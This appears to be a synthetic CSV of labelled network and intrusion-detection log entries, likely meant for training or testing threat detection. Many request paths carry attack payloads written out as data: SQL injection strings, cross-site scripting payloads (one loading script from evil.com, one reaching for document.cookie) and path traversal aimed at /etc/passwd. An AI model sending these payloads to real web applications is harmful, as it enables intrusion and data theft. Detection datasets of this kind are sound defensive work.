timestamp,source_ip,dest_ip,protocol,action,threat_label,log_type,bytes_transferred,user_agent,request_path
2024-05-03T07:23:17,192.168.1.108,192.168.1.94,HTTP,allowed,malicious,ids,249,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-01T14:46:36,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,474,python-requests/2.28.0,/admin/login.php
2024-05-01T22:50:31,192.168.1.8,192.168.1.250,TCP,blocked,suspicious,ids,736,gobuster/3.1,/phpinfo.php
2024-05-01T22:53:43,192.168.1.243,192.168.1.218,HTTP,blocked,suspicious,ids,1457,nikto/2.1.6,/login
2024-05-01T14:40:51,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,774,python-requests/2.28.0,/admin/login.php
2024-05-01T14:45:39,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,563,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:30,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,356,python-requests/2.28.0,/admin/login.php
2024-05-02T09:36:07,192.168.1.33,192.168.1.184,UDP,allowed,benign,application,637,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login
2024-05-03T01:22:45,192.168.1.116,192.168.1.85,ICMP,allowed,benign,application,20132,python-requests/2.28.0,/index.php
2024-05-03T09:06:54,192.168.1.177,192.168.1.213,TCP,blocked,suspicious,ids,1527,Nmap Scripting Engine,/admin/
2024-05-02T09:24:28,192.168.1.137,192.168.1.209,HTTP,blocked,malicious,ids,1279,curl/7.85,/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-01T14:40:30,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,232,python-requests/2.28.0,/admin/login.php
2024-05-03T10:22:54,192.168.1.223,192.168.1.98,TCP,allowed,suspicious,ids,1969,Nmap Scripting Engine,/phpinfo.php
2024-05-03T00:08:44,192.168.1.114,192.168.1.162,TCP,allowed,malicious,ids,1311,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1' AND '1'='1
2024-05-02T00:11:29,192.168.1.185,192.168.1.140,TCP,blocked,malicious,ids,1210,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/page?name=<script>alert(1)</script>
2024-05-02T22:43:23,192.168.1.76,192.168.1.210,SSH,allowed,benign,application,24159,curl/7.85,/
2024-05-02T15:11:47,192.168.1.243,192.168.1.241,TCP,blocked,malicious,ids,613,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login?pass=admin' OR 'x'='x
2024-05-01T14:42:03,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,749,python-requests/2.28.0,/admin/login.php
2024-05-01T23:56:24,192.168.1.222,192.168.1.18,HTTP,allowed,suspicious,ids,796,dirb/2.22,/phpinfo.php
2024-05-02T11:39:30,192.168.1.117,192.168.1.19,HTTP,blocked,malicious,ids,1000,curl/7.85,/query?val=1/*comment*/OR/**/1=1
2024-05-01T15:07:03,192.168.1.185,192.168.1.37,HTTP,blocked,suspicious,ids,253,gobuster/3.1,/.git/
2024-05-01T14:57:39,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,265,python-requests/2.28.0,/admin/login.php
2024-05-01T17:56:40,192.168.1.173,192.168.1.168,TCP,blocked,suspicious,ids,924,gobuster/3.1,/robots.txt
2024-05-01T14:20:23,192.168.1.10,192.168.1.137,HTTP,allowed,benign,application,24551,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-01T14:46:30,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,523,python-requests/2.28.0,/admin/login.php
2024-05-03T04:07:01,192.168.1.164,192.168.1.164,ICMP,allowed,benign,ids,22852,curl/7.85,/dashboard
2024-05-02T04:32:21,192.168.1.61,192.168.1.189,HTTP,allowed,benign,ids,13651,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/dashboard
2024-05-01T14:57:06,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,570,python-requests/2.28.0,/admin/login.php
2024-05-01T14:24:36,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,3521372,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-01T16:21:29,192.168.1.155,192.168.1.40,TCP,allowed,malicious,ids,861,curl/7.85,/login?user=admin'--
2024-05-02T15:59:03,192.168.1.221,192.168.1.235,SSH,allowed,benign,ids,30717,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:30,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,203,python-requests/2.28.0,/admin/login.php
2024-05-02T22:48:16,192.168.1.177,192.168.1.153,HTTP,allowed,suspicious,ids,166,gobuster/3.1,/login
2024-05-02T09:10:21,192.168.1.113,192.168.1.120,TCP,blocked,malicious,ids,650,python-requests/2.28.0,/files/../../etc/passwd
2024-05-01T14:20:35,192.168.1.116,192.168.1.71,HTTP,allowed,benign,firewall,10483,curl/7.85,/login
2024-05-02T23:40:09,192.168.1.173,192.168.1.207,TCP,blocked,malicious,ids,910,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=1 OR 1=1
2024-05-01T14:58:09,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,272,python-requests/2.28.0,/admin/login.php
2024-05-01T14:56:30,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,328,python-requests/2.28.0,/admin/login.php
2024-05-01T14:47:27,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,638,python-requests/2.28.0,/admin/login.php
2024-05-01T14:11:57,192.168.1.4,192.168.1.172,TCP,allowed,benign,firewall,32481,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login
2024-05-03T01:21:48,192.168.1.8,192.168.1.100,HTTP,allowed,suspicious,ids,1583,gobuster/3.1,/login
2024-05-02T02:47:57,192.168.1.166,192.168.1.156,TCP,allowed,benign,ids,9275,python-requests/2.28.0,/dashboard
2024-05-02T18:44:55,192.168.1.232,192.168.1.219,HTTP,blocked,malicious,ids,346,curl/7.85,/img/../../../../etc/hosts
2024-05-01T14:47:21,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,469,python-requests/2.28.0,/admin/login.php
2024-05-01T15:10:51,192.168.1.67,192.168.1.142,TCP,allowed,malicious,ids,412,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36","/input?val=data:text/html,<script>alert(1)</script>"
2024-05-01T19:24:45,192.168.1.242,192.168.1.210,HTTP,blocked,malicious,ids,944,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/profile?bio=<img src=x onerror=alert(1)>
2024-05-01T14:40:48,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,227,python-requests/2.28.0,/admin/login.php
2024-05-01T15:21:52,192.168.1.118,192.168.1.236,HTTP,allowed,malicious,ids,1279,curl/7.85,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-01T14:59:09,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,743,python-requests/2.28.0,/admin/login.php
2024-05-03T11:22:36,192.168.1.81,192.168.1.170,TCP,allowed,suspicious,ids,1138,sqlmap/1.7,/admin/
2024-05-01T14:40:41,192.168.1.118,192.168.1.160,TCP,blocked,suspicious,ids,1201,Nmap Scripting Engine,/login
2024-05-01T17:32:35,192.168.1.13,192.168.1.73,TCP,allowed,malicious,ids,685,python-requests/2.28.0,/search?q=1 OR 1=1
2024-05-01T16:07:32,192.168.1.189,192.168.1.158,HTTP,allowed,malicious,ids,1312,curl/7.85,/update?field=vbscript:msgbox(1)
2024-05-01T18:23:15,192.168.1.240,192.168.1.229,HTTP,allowed,malicious,ids,164,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/update?field=vbscript:msgbox(1)
2024-05-01T23:32:33,192.168.1.153,192.168.1.97,HTTP,blocked,malicious,ids,470,python-requests/2.28.0,/product?id=1 UNION SELECT * FROM users
2024-05-02T23:50:20,192.168.1.146,192.168.1.157,HTTP,allowed,suspicious,ids,158,nikto/2.1.6,/.git/
2024-05-02T20:23:21,192.168.1.62,192.168.1.147,HTTP,allowed,benign,ids,20572,python-requests/2.28.0,/ssh
2024-05-02T11:08:36,192.168.1.229,192.168.1.77,HTTP,blocked,malicious,ids,840,python-requests/2.28.0,/page?id=1; DROP TABLE users--
2024-05-01T14:57:09,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,424,python-requests/2.28.0,/admin/login.php
2024-05-03T08:45:10,192.168.1.244,192.168.1.6,HTTP,blocked,suspicious,ids,1662,dirb/2.22,/login
2024-05-01T21:29:06,192.168.1.91,192.168.1.200,HTTP,blocked,suspicious,ids,1995,nikto/2.1.6,/login
2024-05-01T18:56:57,192.168.1.182,192.168.1.39,HTTP,blocked,malicious,ids,1135,curl/7.85,"/input?val=data:text/html,<script>alert(1)</script>"
2024-05-03T10:19:15,192.168.1.175,192.168.1.178,TCP,blocked,malicious,ids,910,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/static/..%2F..%2Fetc%2Fpasswd
2024-05-02T11:28:58,192.168.1.146,192.168.1.173,HTTP,blocked,malicious,ids,1351,curl/7.85,/api?filter=SELECT username FROM users
2024-05-02T17:20:24,192.168.1.42,192.168.1.188,HTTP,blocked,malicious,ids,792,python-requests/2.28.0,/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-02T16:06:44,192.168.1.157,192.168.1.8,HTTP,allowed,benign,ids,32089,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ftp
2024-05-03T06:18:59,192.168.1.131,192.168.1.143,ICMP,allowed,benign,application,10239,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/
2024-05-02T16:51:43,192.168.1.43,192.168.1.156,TCP,blocked,suspicious,ids,737,sqlmap/1.7,/wp-admin/
2024-05-01T14:24:28,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,3842459,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-02T19:10:10,192.168.1.14,192.168.1.146,HTTP,allowed,malicious,ids,1233,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login?user=admin'--
2024-05-01T14:56:42,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,369,python-requests/2.28.0,/admin/login.php
2024-05-02T00:21:09,192.168.1.148,192.168.1.162,TCP,allowed,malicious,ids,868,curl/7.85,/search?q=<script src='http://evil.com/x.js'>
2024-05-01T14:46:45,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,780,python-requests/2.28.0,/admin/login.php
2024-05-02T17:36:19,192.168.1.84,192.168.1.55,HTTP,allowed,suspicious,ids,791,sqlmap/1.7,/.git/
2024-05-02T15:48:34,192.168.1.69,192.168.1.204,TCP,blocked,malicious,ids,864,curl/7.85,/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-01T14:41:42,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,589,python-requests/2.28.0,/admin/login.php
2024-05-01T14:46:39,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,267,python-requests/2.28.0,/admin/login.php
2024-05-03T04:33:03,192.168.1.79,192.168.1.86,UDP,allowed,benign,ids,10389,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-01T23:43:34,192.168.1.123,192.168.1.40,TCP,allowed,malicious,ids,951,python-requests/2.28.0,/query?val=1/*comment*/OR/**/1=1
2024-05-02T09:09:02,192.168.1.213,192.168.1.134,HTTP,allowed,benign,ids,26953,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.php
2024-05-03T03:08:00,192.168.1.50,192.168.1.232,TCP,allowed,malicious,ids,1421,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/page?id=1; DROP TABLE users--
2024-05-03T01:46:05,192.168.1.52,192.168.1.32,HTTP,blocked,malicious,ids,1025,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/query?val=1/*comment*/OR/**/1=1
2024-05-02T04:42:53,192.168.1.28,192.168.1.125,HTTP,allowed,benign,firewall,2185,python-requests/2.28.0,/ftp
2024-05-03T11:34:07,192.168.1.66,192.168.1.225,UDP,allowed,benign,firewall,18462,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.php
2024-05-03T09:20:36,192.168.1.165,192.168.1.77,TCP,allowed,benign,application,25105,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/
2024-05-01T14:59:06,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,752,python-requests/2.28.0,/admin/login.php
2024-05-03T01:52:29,192.168.1.158,192.168.1.2,ICMP,allowed,benign,firewall,31707,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-01T14:46:48,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,522,python-requests/2.28.0,/admin/login.php
2024-05-02T12:26:48,192.168.1.94,192.168.1.231,TCP,allowed,suspicious,ids,530,Nmap Scripting Engine,/robots.txt
2024-05-01T14:37:01,192.168.1.157,192.168.1.167,HTTP,allowed,malicious,ids,819,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/img/../../../../etc/hosts
2024-05-02T18:03:07,192.168.1.4,192.168.1.75,TCP,allowed,malicious,ids,273,python-requests/2.28.0,/profile?bio=<img src=x onerror=alert(1)>
2024-05-01T14:00:32,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,1536636,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-02T05:16:58,192.168.1.208,192.168.1.189,TCP,allowed,malicious,ids,439,python-requests/2.28.0,/comment?text=</script><script>document.cookie
2024-05-03T07:45:36,192.168.1.152,192.168.1.42,HTTP,allowed,benign,application,33696,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-01T14:40:54,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,403,python-requests/2.28.0,/admin/login.php
2024-05-02T11:28:28,192.168.1.6,192.168.1.82,TCP,blocked,malicious,ids,251,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/img/../../../../etc/hosts
2024-05-02T15:04:46,192.168.1.242,192.168.1.165,TCP,allowed,malicious,ids,952,curl/7.85,/comment?text=</script><script>document.cookie
2024-05-01T19:52:58,192.168.1.83,192.168.1.156,HTTP,blocked,malicious,ids,358,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-01T20:08:21,192.168.1.168,192.168.1.239,UDP,allowed,benign,ids,15131,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/admin/login.php
2024-05-01T19:11:42,192.168.1.21,192.168.1.42,SSH,allowed,benign,firewall,20644,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-01T14:42:24,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,791,python-requests/2.28.0,/admin/login.php
2024-05-03T02:36:55,192.168.1.28,192.168.1.75,SSH,allowed,benign,application,5769,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.html
2024-05-02T00:06:23,192.168.1.195,192.168.1.181,TCP,allowed,malicious,ids,1360,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?user=admin'--
2024-05-02T10:51:41,192.168.1.161,192.168.1.183,TCP,allowed,malicious,ids,923,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/view?doc=..%252f..%252fetc%252fpasswd
2024-05-01T14:56:38,192.168.1.191,192.168.1.65,HTTP,allowed,benign,application,29136,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ssh
2024-05-01T17:59:20,192.168.1.2,192.168.1.53,TCP,blocked,malicious,ids,381,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/items?category=1 AND 1=1
2024-05-02T05:58:24,192.168.1.213,192.168.1.106,ICMP,allowed,benign,firewall,12019,python-requests/2.28.0,/admin/login.php
2024-05-01T23:17:36,192.168.1.252,192.168.1.160,TCP,allowed,suspicious,ids,1312,gobuster/3.1,/phpinfo.php
2024-05-01T14:45:03,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,246,python-requests/2.28.0,/admin/login.php
2024-05-03T05:57:58,192.168.1.119,192.168.1.166,ICMP,allowed,benign,firewall,19148,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/admin/login.php
2024-05-02T04:09:30,192.168.1.184,192.168.1.179,HTTP,allowed,suspicious,ids,918,dirb/2.22,/login
2024-05-03T00:49:48,192.168.1.241,192.168.1.139,TCP,allowed,benign,application,22859,curl/7.85,/index.php
2024-05-03T13:29:56,192.168.1.147,192.168.1.60,HTTP,blocked,malicious,ids,955,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/search?q=1 OR 1=1
2024-05-01T14:57:12,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,341,python-requests/2.28.0,/admin/login.php
2024-05-01T20:12:09,192.168.1.64,192.168.1.31,HTTP,blocked,suspicious,ids,1688,sqlmap/1.7,/phpinfo.php
2024-05-02T09:59:05,192.168.1.33,192.168.1.161,TCP,blocked,malicious,ids,1129,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-01T14:57:06,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,608,python-requests/2.28.0,/admin/login.php
2024-05-03T01:42:44,192.168.1.10,192.168.1.24,HTTP,blocked,malicious,ids,1332,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/files/../../etc/passwd
2024-05-01T14:45:09,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,496,python-requests/2.28.0,/admin/login.php
2024-05-02T03:47:45,192.168.1.50,192.168.1.135,HTTP,allowed,benign,application,11824,python-requests/2.28.0,/ftp
2024-05-01T14:57:36,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,632,python-requests/2.28.0,/admin/login.php
2024-05-02T10:55:11,192.168.1.24,192.168.1.103,SSH,allowed,benign,firewall,11797,curl/7.85,/ssh
2024-05-01T14:47:24,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,798,python-requests/2.28.0,/admin/login.php
2024-05-02T23:49:38,192.168.1.13,192.168.1.143,TCP,blocked,suspicious,ids,1034,dirb/2.22,/login
2024-05-03T06:18:38,192.168.1.162,192.168.1.56,HTTP,allowed,benign,firewall,19143,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.php
2024-05-01T22:34:30,192.168.1.68,192.168.1.199,TCP,allowed,malicious,ids,539,python-requests/2.28.0,/items?category=1 AND 1=1
2024-05-03T01:43:28,192.168.1.59,192.168.1.92,TCP,allowed,malicious,ids,480,python-requests/2.28.0,/update?field=vbscript:msgbox(1)
2024-05-01T14:24:20,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,4141370,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-03T12:18:11,192.168.1.2,192.168.1.206,TCP,allowed,benign,firewall,31011,python-requests/2.28.0,/ftp
2024-05-02T12:31:18,192.168.1.102,192.168.1.184,TCP,allowed,malicious,ids,938,python-requests/2.28.0,/login?user=admin'--
2024-05-02T01:13:48,192.168.1.98,192.168.1.183,HTTP,allowed,malicious,ids,748,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=<script src='http://evil.com/x.js'>
2024-05-02T05:35:49,192.168.1.88,192.168.1.243,TCP,blocked,malicious,ids,563,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/product?id=1 UNION SELECT * FROM users
2024-05-02T23:02:18,192.168.1.130,192.168.1.155,TCP,blocked,malicious,ids,334,python-requests/2.28.0,/page?id=1; DROP TABLE users--
2024-05-02T22:01:49,192.168.1.20,192.168.1.183,HTTP,blocked,suspicious,ids,656,sqlmap/1.7,/admin/
2024-05-01T23:20:42,192.168.1.225,192.168.1.213,HTTP,blocked,malicious,ids,986,python-requests/2.28.0,/search?q=1 OR 1=1
2024-05-02T08:52:25,192.168.1.193,192.168.1.64,HTTP,allowed,suspicious,ids,1383,gobuster/3.1,/login
2024-05-01T14:07:23,192.168.1.134,192.168.1.237,TCP,allowed,suspicious,ids,983,gobuster/3.1,/wp-admin/
2024-05-01T14:00:36,192.168.1.99,192.168.1.20,TCP,allowed,suspicious,firewall,1932198,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-03T06:56:38,192.168.1.123,192.168.1.150,ICMP,allowed,benign,application,27459,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:04,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,1267752,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-01T19:09:27,192.168.1.59,192.168.1.99,HTTP,blocked,malicious,ids,311,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-01T19:01:16,192.168.1.130,192.168.1.166,HTTP,blocked,suspicious,ids,1839,sqlmap/1.7,/.git/
2024-05-02T21:34:42,192.168.1.228,192.168.1.176,HTTP,allowed,benign,ids,32224,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-02T02:08:48,192.168.1.203,192.168.1.47,ICMP,allowed,benign,ids,33175,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.php
2024-05-02T02:49:33,192.168.1.188,192.168.1.134,HTTP,allowed,suspicious,ids,1052,gobuster/3.1,/.git/
2024-05-02T13:53:35,192.168.1.31,192.168.1.2,TCP,allowed,malicious,ids,459,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/api?filter=SELECT username FROM users
